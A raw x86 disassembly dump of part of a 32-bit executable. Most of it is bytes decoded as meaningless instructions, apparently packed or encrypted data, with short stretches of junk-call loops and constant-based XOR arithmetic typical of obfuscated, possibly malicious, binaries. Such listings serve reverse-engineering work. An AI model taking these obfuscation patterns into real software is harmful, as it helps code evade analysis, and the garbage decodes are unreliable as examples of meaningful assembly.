  40a815:	jae    0x40a824
  40a817:	scas   eax,DWORD PTR es:[edi]
  40a818:	shr    DWORD PTR [ecx-0x2d8f0e58],cl
  40a81e:	push   cs
  40a81f:	pop    eax
  40a820:	push   0xffffff81
  40a822:	std    
  40a823:	call   0xa754d851
  40a828:	scas   al,BYTE PTR es:[edi]
  40a829:	push   ebp
  40a82a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a82b:	ret    
  40a82c:	cli    
  40a82d:	fldz   
  40a82f:	in     al,0xe4
  40a831:	in     al,0xb6
  40a833:	mov    ds:0x2e6a0f02,eax
  40a838:	imul   esp,edi,0x934f219a
  40a83e:	jge    0x40a89e
  40a840:	fsub   QWORD PTR [edi+0xf]
  40a843:	cli    
  40a844:	call   0xb46b:0x5bbd127c
  40a84b:	lds    ebp,FWORD PTR [eax-0x2f663634]
  40a851:	or     ebx,esi
  40a853:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a854:	or     DWORD PTR [edx],ebp
  40a856:	rol    esi,cl
  40a858:	scas   eax,DWORD PTR es:[edi]
  40a859:	jno    0x40a848
  40a85b:	arpl   WORD PTR [ecx],bx
  40a85d:	xchg   BYTE PTR [ecx+0x34a053ce],al
  40a863:	mov    al,ds:0xac67f007
  40a868:	out    dx,al
  40a869:	inc    ebx
  40a86a:	ins    DWORD PTR es:[edi],dx
  40a86b:	adc    eax,0xb59a6c4f
  40a870:	sub    dh,dh
  40a872:	out    0xcd,al
  40a874:	in     eax,0x1b
  40a876:	mov    WORD PTR [ebp-0x5c0753d4],gs
  40a87c:	jae    0x40a816
  40a87e:	scas   eax,DWORD PTR es:[edi]
  40a87f:	icebp  
  40a880:	push   edi
  40a881:	lods   al,BYTE PTR ds:[esi]
  40a882:	mov    dh,0x75
  40a884:	mov    ebp,0x5f40ffcb
  40a889:	scas   eax,DWORD PTR es:[edi]
  40a88a:	pop    esp
  40a88b:	xchg   esi,ecx
  40a88d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a88e:	xchg   edi,eax
  40a88f:	push   cs
  40a890:	leave  
  40a891:	dec    edx
  40a892:	pop    esi
  40a893:	adc    BYTE PTR [edx+0x2f],ah
  40a896:	fist   WORD PTR [edx]
  40a898:	jo     0x40a87e
  40a89a:	sahf   
  40a89b:	mov    bh,0x68
  40a89d:	push   esi
  40a89e:	(bad)  [edx-0x3a43471]
  40a8a4:	(bad)  
  40a8a5:	inc    DWORD PTR [ecx]
  40a8a7:	ja     0x40a8d3
  40a8a9:	dec    esp
  40a8aa:	adc    al,0xaa
  40a8ac:	add    BYTE PTR [edx-0x7ad2c70f],dl
  40a8b2:	mov    ah,0x8b
  40a8b4:	mov    ebp,0xa0a6427a
  40a8b9:	popf   
  40a8ba:	fs das 
  40a8bc:	xchg   ecx,eax
  40a8bd:	pop    edx
  40a8be:	call   0x9412:0xd55df0b6
  40a8c5:	cmp    dl,BYTE PTR [eax+0x69]
  40a8c8:	ins    DWORD PTR es:[edi],dx
  40a8c9:	sti    
  40a8ca:	jbe    0x40a93a
  40a8cc:	sub    BYTE PTR [edx+0x7a],cl
  40a8cf:	les    edx,FWORD PTR [eax+0x7bf87eff]
  40a8d5:	out    dx,al
  40a8d6:	push   ebx
  40a8d7:	pop    edx
  40a8d8:	pop    es
  40a8d9:	enter  0xde57,0x6a
  40a8dd:	push   ds
  40a8de:	push   edi
  40a8df:	ss cwde 
  40a8e1:	sahf   
  40a8e2:	rcr    BYTE PTR [eax+0x27],0x28
  40a8e6:	pop    esi
  40a8e7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a8e8:	lahf   
  40a8e9:	jae    0x40a8d6
  40a8eb:	mov    ds:0x867c0247,al
  40a8f0:	cli    
  40a8f1:	mov    ds:0xa26a4cf9,eax
  40a8f6:	mov    eax,ds:0xffa21f91
  40a8fb:	sub    DWORD PTR fs:[ebx-0x4c],esp
  40a8ff:	repz imul eax,DWORD PTR [ecx+edx*8-0x7c],0x4707a561
  40a908:	push   ebx
  40a909:	cdq    
  40a90a:	inc    esi
  40a90b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a90c:	out    dx,eax
  40a90d:	or     eax,DWORD PTR [edx+0x59bae3d]
  40a913:	sbb    eax,0x4e620a24
  40a918:	xlat   BYTE PTR ds:[ebx]
  40a919:	call   0xfc863454
  40a91e:	push   esi
  40a91f:	or     DWORD PTR ds:0x41abe2,edx
  40a925:	mov    esi,DWORD PTR [ebp-0x8]
  40a928:	and    DWORD PTR ds:0x412370,0x0
  40a932:	mov    ecx,DWORD PTR ds:0x412370
  40a938:	inc    ecx
  40a939:	mov    DWORD PTR ds:0x412370,ecx
  40a93f:	cmp    DWORD PTR ds:0x412370,0x26
  40a946:	jne    0x40a962
  40a94c:	push   DWORD PTR [ebp-0x14]
  40a94f:	push   DWORD PTR [ebp-0x24]
  40a952:	push   0x8e18
  40a957:	push   0x31c8
  40a95c:	call   DWORD PTR ds:0x40d024
  40a962:	cmp    DWORD PTR ds:0x412370,0x1b
  40a969:	jb     0x40a932
  40a96f:	mov    edx,0x7510859
  40a974:	xor    eax,edx
  40a976:	xor    esi,edx
  40a978:	mov    ecx,0x32729f
  40a97d:	add    esi,ecx
  40a97f:	add    eax,ecx
  40a981:	imul   eax,esi
  40a984:	mov    esi,DWORD PTR [ebp+0xc]
  40a987:	cmp    esi,eax
  40a989:	jne    0x40ac95
  40a98f:	mov    eax,DWORD PTR [ebp-0x4]
  40a992:	mov    esi,DWORD PTR [ebp-0x8]
  40a995:	jmp    0x40ab0d
  40a99a:	addr16 jno 0x40a945
  40a99d:	mov    ds:0xc965bb78,eax
  40a9a2:	jl     0x40a9a2
  40a9a4:	arpl   bx,dx
  40a9a6:	inc    edx
  40a9a7:	xchg   edi,eax
  40a9a8:	cmp    BYTE PTR [ebx],bh
  40a9aa:	loopne 0x40a9e6
  40a9ac:	jle    0x40aa2c
  40a9ae:	lds    edi,FWORD PTR [edi+0x7e]
  40a9b1:	jle    0x40a969
  40a9b3:	sbb    al,0xad
  40a9b5:	cmp    eax,0xb73a5ed3
  40a9ba:	mov    ch,0xb2
  40a9bc:	shl    BYTE PTR [ecx+0x5c],1
  40a9bf:	lock loope 0x40a9d2
  40a9c2:	push   ebx
  40a9c3:	pop    ebp
  40a9c4:	dec    ebx
  40a9c5:	out    0x15,al
  40a9c7:	mov    ds:0x4d38a4c5,al
  40a9cc:	or     esi,ecx
  40a9ce:	dec    esp
  40a9cf:	and    BYTE PTR [edi],bh
  40a9d1:	jb     0x40a967
  40a9d3:	xchg   BYTE PTR [ecx+0x489783d1],ch
  40a9d9:	adc    ecx,DWORD PTR [ebx+ebx*1+0x1db8e2b4]
  40a9e0:	add    BYTE PTR [ebx],ah
  40a9e2:	ins    BYTE PTR es:[edi],dx
  40a9e3:	and    BYTE PTR cs:[esi-0x5ecdd441],bl
  40a9ea:	sti    
  40a9eb:	popa   
  40a9ec:	mov    WORD PTR [esi-0x5d1900e0],ds
  40a9f2:	and    ch,ch
  40a9f4:	ja     0x40a9c1
  40a9f6:	dec    ebp
  40a9f7:	cmp    ch,cl
  40a9f9:	ja     0x40aa13
  40a9fb:	adc    al,0x8c
  40a9fd:	dec    esi
  40a9fe:	outs   dx,BYTE PTR ds:[esi]
  40a9ff:	sub    al,0xfa
  40aa01:	and    eax,0x8f080c97
  40aa06:	mov    dh,dh
  40aa08:	das    
  40aa09:	cli    
  40aa0a:	sub    DWORD PTR [ebp-0x1ed52e3b],edx
  40aa10:	add    DWORD PTR [ebp+0x5],esi
  40aa13:	dec    eax
  40aa14:	imul   edi,DWORD PTR [esi+eiz*2+0x1d],0x64d27afe
  40aa1c:	mov    bl,0x68
  40aa1e:	lea    edx,[edx-0x6c]
  40aa21:	xchg   edx,eax
  40aa22:	mov    ebx,0x7d2ab3c4
  40aa27:	bound  edi,QWORD PTR [ebp-0x4]
  40aa2a:	mov    edi,0xa932bf1c
  40aa2f:	mov    ch,0x68
  40aa31:	pushf  
  40aa32:	jmp    DWORD PTR [esi+0x7d]
  40aa35:	or     ch,cl
  40aa37:	xchg   ebp,eax
  40aa38:	imul   edi,DWORD PTR [esp+ecx*2-0x8019df9],0x7df08842
  40aa43:	call   0xc774:0x822ea207
  40aa4a:	das    
  40aa4b:	and    eax,0xd36dd664
  40aa50:	jo     0x40a9fa
  40aa52:	lods   al,BYTE PTR ds:[esi]
  40aa53:	sub    BYTE PTR [ebx-0x42],0xc0
  40aa57:	inc    eax
  40aa58:	repz mov bh,0xf3
  40aa5b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40aa5c:	lock fsave [edx]
  40aa60:	jg     0x40aa5c
  40aa62:	sub    eax,0x20bdbefc
  40aa67:	mov    cl,BYTE PTR [eax+0xed6e0f4]
  40aa6d:	(bad)  
  40aa6e:	fadd   QWORD PTR [edx+0x38]
  40aa71:	xor    BYTE PTR [edx],bh
  40aa73:	adc    eax,0xc9133694
  40aa78:	adc    al,0xfc
  40aa7a:	loope  0x40aa82
  40aa7c:	ret    
  40aa7d:	(bad)  
  40aa7e:	nop
  40aa7f:	mov    cl,0xd8
  40aa81:	lock pop ss
  40aa83:	das    
  40aa84:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40aa85:	jae    0x40aa79
  40aa87:	std    
  40aa88:	jne    0x40aa8c
  40aa8a:	test   eax,0x1d75f2ef
  40aa8f:	gs test al,ch
  40aa92:	adc    eax,0x180bcdbf
  40aa97:	(bad)  
  40aa98:	in     eax,0x63
  40aa9a:	out    dx,al
  40aa9b:	(bad)  
  40aa9c:	(bad)  
  40aa9e:	sbb    ch,bh
  40aaa0:	(bad)  
  40aaa1:	stos   DWORD PTR es:[edi],eax
  40aaa2:	and    DWORD PTR [esi-0x5b],esp
  40aaa5:	mov    eax,ds:0xadcab5f8
  40aaaa:	imul   esp,DWORD PTR [edx+0xab4c926],0x51
  40aab1:	xchg   edi,eax
  40aab2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aab3:	mul    BYTE PTR [edx+0x19d40e0d]
  40aab9:	xchg   cl,dl
  40aabb:	pop    ss
  40aabc:	mov    eax,0x42657d03
  40aac1:	adc    al,0xf5
  40aac3:	lahf   
  40aac4:	cld    
  40aac5:	(bad)  
  40aac6:	xchg   edx,eax
  40aac7:	addr16 mov esi,0xee841e1f
  40aacd:	and    DWORD PTR [ebp+eax*1+0x58],esp
  40aad1:	or     eax,0x9ee58936
  40aad6:	mov    ch,0xde
  40aad8:	out    0x3,eax
  40aada:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aadb:	mov    ah,0x2d
  40aadd:	mov    dl,0xc3
  40aadf:	push   edi
  40aae0:	fidiv  WORD PTR [edx-0xb]
  40aae3:	int    0xd4
  40aae5:	pop    ecx
  40aae6:	test   DWORD PTR [eax+0x5e],esp
  40aae9:	push   0x95e39401
  40aaee:	and    eax,DWORD PTR [edi-0x44]
  40aaf1:	es or  eax,0xcb81010d
  40aaf7:	cmp    DWORD PTR ds:0x76a92923,0xb7af8486
  40ab01:	add    eax,0xfe479a3e
  40ab06:	test   DWORD PTR [ecx],0x71831d9c
  40ab0c:	jmp    0xc103:0xf233c233
  40ab13:	jmp    0x40ac8b
  40ab18:	jg     0x40aacf
  40ab1a:	add    eax,0x117b453b
  40ab1f:	jns    0x40aab9
  40ab21:	cmp    eax,0x9192ac8b
  40ab26:	inc    ecx
  40ab27:	test   DWORD PTR [edi+0x3b],0x7fc57e7e
  40ab2e:	jle    0x40abae
  40ab30:	stos   BYTE PTR es:[edi],al
  40ab31:	add    ch,BYTE PTR [esi-0x197ce740]
  40ab37:	movzx  ebp,WORD PTR [edi]
  40ab3a:	dec    ecx
  40ab3b:	xchg   DWORD PTR es:0x75f1cd07,edx
  40ab42:	test   BYTE PTR [ebx-0xee673f5],0x2a
  40ab49:	mov    ds:0xcfde5630,eax
  40ab4e:	sahf   
  40ab4f:	mov    ebp,0x7cb20e8d
  40ab54:	rol    ch,0x48
  40ab57:	xor    al,0x39
  40ab59:	dec    edx
  40ab5a:	xchg   DWORD PTR [eax+0x10fb3cf],esi
  40ab60:	arpl   WORD PTR [ecx-0xf],dx
  40ab63:	mov    ah,BYTE PTR ds:0xc08121bc
  40ab69:	gs dec eax
  40ab6b:	sbb    esi,DWORD PTR [ecx*4-0x59baf43f]
  40ab72:	call   0x6b1e:0x95cb8244
  40ab79:	out    0xca,al
  40ab7b:	push   ss
  40ab7c:	daa    
  40ab7d:	imul   edi,DWORD PTR [edi],0x55
  40ab80:	idiv   BYTE PTR [ebx]
  40ab82:	lss    ecx,FWORD PTR [esi]
  40ab85:	or     BYTE PTR [edx-0x1a],bl
  40ab88:	mov    al,ds:0xe8190284
  40ab8d:	out    dx,al
  40ab8e:	jmp    0x40ab77
  40ab90:	aas    
  40ab91:	sub    bh,ah
  40ab93:	outs   dx,DWORD PTR ds:[esi]
  40ab94:	pop    eax
  40ab95:	cmp    dh,dh
  40ab97:	(bad)  
  40ab9a:	mov    dh,ah
  40ab9c:	cmp    al,0xa6
  40ab9e:	out    0x4,al
  40aba0:	out    dx,eax
  40aba1:	sub    DWORD PTR [ebx+ebp*2+0x30],ebp
  40aba5:	in     al,dx
  40aba6:	mov    esi,DWORD PTR [edx+0x1c]
  40aba9:	jg     0x40abcf
  40abab:	ret    0x487f
  40abae:	cmp    eax,0x8fa8b798
  40abb3:	inc    ebp
  40abb4:	enter  0x9c6c,0x1d
  40abb8:	call   0x7c30:0xcd38f965
  40abbf:	mov    esi,DWORD PTR [edx]
  40abc1:	dec    eax
  40abc2:	pop    DWORD PTR [edx+0x7d23d105]
  40abc8:	(bad)  
  40abc9:	leave  
  40abca:	adc    dl,dh
  40abcc:	dec    esp
  40abcd:	vpaddw xmm1,xmm4,XMMWORD PTR [esi]
  40abd1:	fldcw  WORD PTR [ecx+0x6d]
  40abd4:	out    dx,al
  40abd5:	test   DWORD PTR [eax+0x5241f744],ecx
  40abdb:	fisttp DWORD PTR [esi+0x2f]
  40abde:	cmp    BYTE PTR [eax],cl
  40abe0:	mov    ch,0x86
  40abe2:	imul   edx,DWORD PTR [ebp-0xd],0x78d9d5dc
  40abe9:	ins    DWORD PTR es:[edi],dx
  40abea:	mov    esi,0x9962ebb0
  40abef:	call   0x8a3c9913
  40abf4:	hlt    
  40abf5:	push   eax
  40abf6:	mov    dh,ah
  40abf8:	or     eax,eax
  40abfa:	push   edx
  40abfb:	adc    BYTE PTR ds:0x90def3ac,bl
  40ac01:	xchg   edi,eax
  40ac02:	in     eax,dx
  40ac03:	das    
  40ac04:	fstp   TBYTE PTR [eax-0x63d69580]
  40ac0a:	mov    eax,ds:0xd9b4446b
  40ac0f:	mov    al,0x56
  40ac11:	scas   al,BYTE PTR es:[edi]
  40ac12:	dec    esp
  40ac13:	push   ebx
  40ac14:	int    0x36
  40ac16:	das    
  40ac17:	mov    ecx,eax
  40ac19:	pop    ebp
  40ac1a:	pop    ebp
  40ac1b:	or     al,0xa6
  40ac1d:	mov    ebp,0xb429ac2d
  40ac22:	sub    cl,bl
  40ac24:	adc    ecx,edi
  40ac26:	inc    eax
  40ac27:	xchg   edx,eax
  40ac28:	or     BYTE PTR [ecx+0x4d],ah
  40ac2b:	jo     0x40ac1c
  40ac2d:	int3   
  40ac2e:	call   DWORD PTR [esi+0x68]
  40ac31:	mov    es,WORD PTR [esi]
  40ac33:	iret   
  40ac34:	out    0xbb,al
  40ac36:	mov    eax,ds:0x60378012
  40ac3b:	mov    ah,0x9
  40ac3d:	pushf  
  40ac3e:	imul   DWORD PTR [ebx+0x4d]
  40ac41:	push   0xffffffa1
  40ac43:	(bad)  
  40ac44:	mov    al,0x32
  40ac46:	dec    ecx
  40ac47:	les    eax,FWORD PTR ss:[ebx+0x39]
  40ac4b:	fs je  0x40ac53
  40ac4e:	dec    ebx
  40ac4f:	pop    ss
  40ac50:	cli    
  40ac51:	xlat   BYTE PTR ds:[ebx]
  40ac52:	jge    0x40ac42
  40ac54:	sub    eax,0xc6c2a9ad
  40ac59:	out    0x50,eax
  40ac5b:	js     0x40ac3b
  40ac5d:	xor    esp,DWORD PTR [esi-0x7c]
  40ac60:	sub    DWORD PTR [edi+0x1c],ecx
  40ac63:	data16 cs sahf 
  40ac66:	(bad)  
  40ac67:	mov    cl,0xbb
  40ac69:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ac6a:	hlt    
  40ac6b:	aaa    
  40ac6c:	outs   dx,BYTE PTR ds:[esi]
  40ac6d:	and    edx,esi
  40ac6f:	lods   eax,DWORD PTR ds:[esi]
  40ac70:	js     0x40ac0d
  40ac72:	pushf  
  40ac73:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ac74:	xchg   edi,eax
  40ac75:	call   0xa654c8fc
  40ac7a:	and    DWORD PTR [ebx+ebx*2-0x7e],edx
  40ac7e:	push   edi
  40ac7f:	add    eax,0x31d11d86
  40ac84:	and    BYTE PTR [edx-0x5bf73d3b],bh
  40ac8a:	sbb    BYTE PTR [ebx],al
  40ac8c:	icebp  
  40ac8d:	imul   eax,esi
  40ac90:	jmp    0x40ae48
  40ac95:	mov    eax,DWORD PTR [ebp+0xc]
  40ac98:	mov    eax,DWORD PTR [eax+0x78]
  40ac9b:	mov    DWORD PTR [ebp+0xc],eax
  40ac9e:	mov    eax,DWORD PTR [ebp-0x4]
  40aca1:	mov    esi,DWORD PTR [ebp-0x8]
  40aca4:	xor    eax,edx
  40aca6:	xor    esi,edx
  40aca8:	add    eax,ecx
  40acaa:	jmp    0x40ae22
  40acaf:	push   ss
  40acb0:	mov    esp,0xb169beb3
  40acb5:	sub    edx,DWORD PTR [esp+edx*4-0x31]
  40acb9:	cmc    
  40acba:	sub    edx,esp
  40acbc:	or     al,0xaf
  40acbe:	mov    bh,0x2a
  40acc0:	cmp    DWORD PTR [esi+0x7e],edi
  40acc3:	lds    edi,FWORD PTR [edi+0x7e]
  40acc6:	jle    0x40ad1c
  40acc8:	pop    esi
  40acc9:	mov    ebx,0x3d32ffdf
  40acce:	dec    esp
  40accf:	add    DWORD PTR [edx],esp
  40acd1:	xor    esp,edx
  40acd3:	pop    edx
  40acd4:	xor    al,0x82
  40acd6:	ss out dx,eax
  40acd8:	fild   WORD PTR [esp+edx*1-0x16]
  40acdc:	popa   
  40acdd:	lods   al,BYTE PTR ds:[esi]
  40acde:	sahf   
  40acdf:	stc    
  40ace0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ace1:	sub    bl,BYTE PTR [ebx]
  40ace3:	mov    DWORD PTR [edx-0x21],esi
  40ace6:	sbb    ebp,esi
  40ace8:	aam    0xb1
  40acea:	dec    edx
  40aceb:	mul    bl
  40aced:	add    esi,ecx
  40acef:	shr    BYTE PTR [ebp-0x37],1
  40acf2:	mov    eax,0x69cb3e37
  40acf7:	dec    ebx
  40acf8:	aam    0x93
  40acfa:	rcr    DWORD PTR [edx],0xc3
  40acfd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40acfe:	jmp    0xf05e342f
  40ad03:	inc    ebp
  40ad04:	mov    dh,0x17
  40ad06:	das    
  40ad07:	lahf   
  40ad08:	mov    ds,WORD PTR [edx+eax*1]
  40ad0b:	mul    BYTE PTR es:[edi+0x6705817f]
  40ad12:	lock imul ecx,DWORD PTR [ebx-0x1a],0x7b
  40ad17:	push   0xf99a84f4
  40ad1c:	xchg   edx,eax
  40ad1d:	inc    esp
  40ad1e:	ffreep st(5)
  40ad20:	aaa    
  40ad21:	cdq    
  40ad22:	test   BYTE PTR [edx+0x6f],al
  40ad25:	in     al,0xe7
  40ad27:	leave  
  40ad28:	cmp    eax,esi
  40ad2a:	or     dl,dh
  40ad2c:	xor    DWORD PTR [eax-0x5df5d991],ebx
  40ad32:	(bad)
  40ad36:	push   ds
  40ad37:	pusha  
  40ad38:	test   eax,0x2f899bd2
  40ad3d:	mov    al,ds:0x38ae3f85
  40ad42:	xor    eax,DWORD PTR [edx+0x35]
  40ad45:	ss add eax,0x90f5d640
  40ad4b:	mov    al,ds:0x64ee0ca1
  40ad50:	std    
  40ad51:	sbb    DWORD PTR [esi+eax*8-0x7e],ebp
  40ad55:	add    DWORD PTR [eax],0xffae4cbf
  40ad5b:	cmp    BYTE PTR [edx-0x1a],dh
  40ad5e:	mov    dl,BYTE PTR ds:0x11d24db3
  40ad64:	repz jmp 0xb7b5:0xd0213071
  40ad6c:	jno    0x40ad63
  40ad6e:	pop    es
  40ad6f:	add    al,0xe2
  40ad71:	mov    dl,0xc6
  40ad73:	dec    ebp
  40ad74:	cmp    dh,cl
  40ad76:	in     eax,0x74
  40ad78:	out    dx,al
  40ad79:	daa    
  40ad7a:	cli    
  40ad7b:	inc    edx
  40ad7c:	daa    
  40ad7d:	xor    dh,BYTE PTR [edx]
  40ad7f:	ja     0x40ad56
  40ad81:	es retf 
  40ad83:	imul   ebp,DWORD PTR [edx+0x4a361ba1],0xffffffac
  40ad8a:	mov    dl,dh
  40ad8c:	push   es
  40ad8d:	push   ebx
  40ad8e:	lods   eax,DWORD PTR ds:[esi]
  40ad8f:	mov    dl,0x4d
  40ad91:	test   eax,0x6a4cb1d5
  40ad96:	inc    esp
  40ad97:	inc    edi
  40ad98:	ror    bh,cl
  40ad9a:	add    eax,0xc1397242
  40ad9f:	sar    DWORD PTR [ebp+ebx*8+0x3317cac4],1
  40ada6:	enter  0x2039,0xb5
  40adaa:	add    ch,dh
  40adac:	fdiv   QWORD PTR [edi-0x43ec38d8]
  40adb2:	or     dl,BYTE PTR [edx+0x2b]
  40adb5:	mov    eax,ds:0x80cf4278
  40adba:	dec    ebx
  40adbb:	push   edi
  40adbc:	call   0xaf5acf64
  40adc1:	inc    eax
  40adc2:	xor    DWORD PTR [ecx],esp
  40adc4:	jns    0x40ad5b
  40adc6:	test   DWORD PTR [edx+0x65],0x5ae7d2cf
  40adcd:	ret    
  40adce:	dec    ebp
  40adcf:	xchg   ebx,eax
  40add0:	inc    eax
  40add1:	lock jmp 0x681b:0x74ab
  40add8:	ins    BYTE PTR es:[edi],dx
  40add9:	addr16 push 0x53
  40addc:	fsub   QWORD PTR [eax+0x6a418ec9]
  40ade2:	fmul   DWORD PTR [eax+0x5c639cb0]
  40ade8:	repz pop esi
  40adea:	(bad)  
  40adeb:	addr16 inc ebp
  40aded:	inc    esi
  40adee:	cmc    
  40adef:	outs   dx,BYTE PTR ds:[esi]
  40adf0:	cdq    
  40adf1:	stos   DWORD PTR es:[edi],eax
  40adf2:	pop    ecx
  40adf3:	pop    ebp
  40adf4:	mov    ds:0xac742634,eax
  40adf9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40adfa:	jbe    0x40ad93
  40adfc:	gs sub eax,0xbb0e61b5
  40ae02:	lock cmp DWORD PTR [edx],0x4c
  40ae06:	pusha  
  40ae07:	jecxz  0x40ae18
  40ae09:	rcl    edi,cl
  40ae0b:	les    esp,FWORD PTR [esi+0x2]
  40ae0e:	or     cl,BYTE PTR [eax+0x441db049]
  40ae14:	lods   eax,DWORD PTR ds:[esi]
  40ae15:	test   al,0xb8
  40ae17:	div    BYTE PTR [eax-0x5d9d506a]
  40ae1d:	jp     0x40ae14
  40ae1f:	xchg   esp,eax
  40ae20:	cmc    
  40ae21:	cli    
  40ae22:	add    esi,ecx
  40ae24:	imul   eax,esi
  40ae27:	mov    esi,DWORD PTR [ebp+0xc]
  40ae2a:	cmp    esi,eax
  40ae2c:	mov    eax,DWORD PTR [ebp-0x4]
  40ae2f:	je     0x40a992
  40ae35:	xor    eax,edx
  40ae37:	add    eax,ecx
  40ae39:	mov    ecx,DWORD PTR [ebp+0xc]
  40ae3c:	imul   eax,ecx
  40ae3f:	add    eax,DWORD PTR [ebp+0x8]
  40ae42:	mov    DWORD PTR [ebp+0xc],eax
  40ae45:	mov    eax,DWORD PTR [ebp+0xc]
  40ae48:	pop    esi
  40ae49:	leave  
  40ae4a:	ret    0x8
  40ae4d:	push   ebp
  40ae4e:	mov    ebp,esp
  40ae50:	sub    esp,0x30
  40ae53:	add    DWORD PTR ds:0x41abce,0x682
  40ae5d:	mov    DWORD PTR [ebp-0x4],0xf89c8538
  40ae64:	mov    DWORD PTR [ebp-0x18],0xf89c853b
  40ae6b:	dec    DWORD PTR ds:0x41abde
  40ae71:	mov    ecx,DWORD PTR [ebp-0x4]
  40ae74:	push   ebx
  40ae75:	mov    eax,0x7510859
  40ae7a:	xor    ebx,0x7bf6
  40ae80:	xor    ecx,eax
  40ae82:	jmp    0x40af67
  40ae87:	je     0x40aef6
  40ae89:	jg     0x40aea2
  40ae8b:	addr16 gs adc al,0x6d
  40ae8f:	test   eax,0x52268d5d
  40ae94:	or     dl,cl
  40ae96:	fdivrp st(1),st
  40ae98:	ds jle 0x40af19
  40ae9b:	mov    dh,0x7e
  40ae9d:	jle    0x40af1d
  40ae9f:	jle    0x40ae73
  40aea1:	sub    BYTE PTR [ecx-0x74e47121],0xc6
  40aea8:	push   ebx
  40aea9:	xchg   edx,eax
  40aeaa:	adc    ecx,DWORD PTR [edx-0x4e6ced74]
  40aeb0:	pop    ds
  40aeb1:	sub    BYTE PTR [edi-0x7e],ah
  40aeb4:	mov    edi,0x9f117955
  40aeb9:	push   0x3e6763f9
  40aebe:	pcmpeqw mm1,QWORD PTR [edi+0x6f4d93b0]
  40aec5:	std    
  40aec6:	cmp    edi,DWORD PTR [eax+0x6d]
  40aec9:	inc    edx
  40aeca:	mov    edi,0x189b6961
  40aecf:	sbb    DWORD PTR [ebx+0x11],eax
  40aed2:	out    0xfd,al
  40aed4:	popa   
  40aed5:	add    al,0xf3
  40aed7:	mov    esi,0xf0acc04c
  40aedc:	add    eax,0x4873de7d
  40aee1:	ja     0x40af50
  40aee3:	inc    eax
  40aee4:	jge    0x40ae95
  40aee6:	rcr    DWORD PTR [eax-0xb],1
  40aee9:	shr    BYTE PTR ds:0x4b738b,1
  40aeef:	fcmovnu st,st(5)
  40aef1:	sub    ah,BYTE PTR [ecx-0x17]
  40aef4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aef5:	out    dx,al
  40aef6:	ins    BYTE PTR es:[edi],dx
  40aef7:	inc    esp
  40aef8:	repnz imul esp,DWORD PTR fs:[ebp-0x48],0xffffff87
  40aefe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aeff:	mov    eax,ds:0x38a7cfea
  40af04:	mov    ebp,0x5a82a556
  40af09:	pxor   mm7,mm4
  40af0c:	pop    es
  40af0d:	mov    cl,0xa6
  40af0f:	or     DWORD PTR [edx+0x2a],ebx
  40af12:	sti    
  40af13:	imul   ebp,DWORD PTR [ebx+0x2977aa2f],0x5c66804a
  40af1d:	mov    WORD PTR [esi+0x44],es
  40af20:	mov    eax,ds:0x917d766b
  40af25:	and    BYTE PTR [edx+0x4a01cf6],ch
  40af2b:	aam    0xe8
  40af2d:	jo     0x40af6b
  40af2f:	inc    bl
  40af31:	sbb    BYTE PTR [esi-0x75d5a929],ch
  40af37:	pop    esp
  40af38:	xor    dl,BYTE PTR [ebp+0x77]
  40af3b:	cmc    
  40af3c:	cmp    BYTE PTR [eax-0x28],al
  40af3f:	ja     0x40aedf
  40af41:	push   ds
  40af42:	int    0x76
  40af44:	push   ds
  40af45:	jb     0x40af20
  40af47:	and    BYTE PTR [ecx],ch
  40af49:	enter  0xa07d,0xb0
  40af4d:	cwde   
  40af4e:	xor    ecx,DWORD PTR [ecx+ebp*2]
  40af51:	mov    ds:0xba8aebeb,al
  40af56:	arpl   WORD PTR [esi],bx
  40af58:	movq   mm0,mm0
  40af5b:	test   eax,0x3795f578
  40af60:	es xor eax,0xbe2d6ef6
  40af66:	hlt    
  40af67:	mov    ebx,0x32729f
  40af6c:	add    ecx,ebx
  40af6e:	and    DWORD PTR ds:0x412370,0x41abce
  40af78:	mov    DWORD PTR [ebp-0x1c],ecx
  40af7b:	mov    DWORD PTR ds:0x41235c,0x5a41
  40af85:	mov    ecx,DWORD PTR [ebp+0x14]
  40af88:	add    DWORD PTR ds:0x41abe6,0x41235c
  40af92:	push   esi
  40af93:	push   edi
  40af94:	or     DWORD PTR ds:0x41510d,0x36ef
  40af9e:	test   ecx,ecx
  40afa0:	je     0x40afae
  40afa6:	mov    ecx,DWORD PTR [ebp+0x14]
  40afa9:	mov    ecx,DWORD PTR [ecx]
  40afab:	mov    DWORD PTR [ebp-0x1c],ecx
  40afae:	movzx  edi,BYTE PTR ds:0x417e3d
  40afb5:	and    DWORD PTR ds:0x417e41,edi
  40afbb:	imul   edx,eax
  40afbe:	sub    DWORD PTR ds:0x412374,ecx
  40afc4:	mov    ecx,0x4573
  40afc9:	and    DWORD PTR ds:0x41abe2,0x0
  40afd3:	mov    esi,DWORD PTR ds:0x41abe2
  40afd9:	inc    esi
  40afda:	mov    DWORD PTR ds:0x41abe2,esi
  40afe0:	cmp    DWORD PTR ds:0x41abe2,0x22
  40afe7:	jne    0x40affd
  40afed:	push   0x2695
  40aff2:	push   0x8176
  40aff7:	call   DWORD PTR ds:0x40d3a0
  40affd:	cmp    DWORD PTR ds:0x41abe2,0x1e
  40b004:	jb     0x40afd3
  40b00a:	add    edx,ecx
  40b00c:	and    DWORD PTR ds:0x41abca,0x0
  40b016:	jmp    0x40b02a
  40b01b:	xor    edi,edi
  40b01d:	xor    edi,DWORD PTR ds:0x41abca
  40b023:	inc    edi
  40b024:	mov    DWORD PTR ds:0x41abca,edi
  40b02a:	cmp    DWORD PTR ds:0x41abca,0x12
  40b031:	jae    0x40b05b
  40b037:	cmp    DWORD PTR ds:0x41abca,0x1d
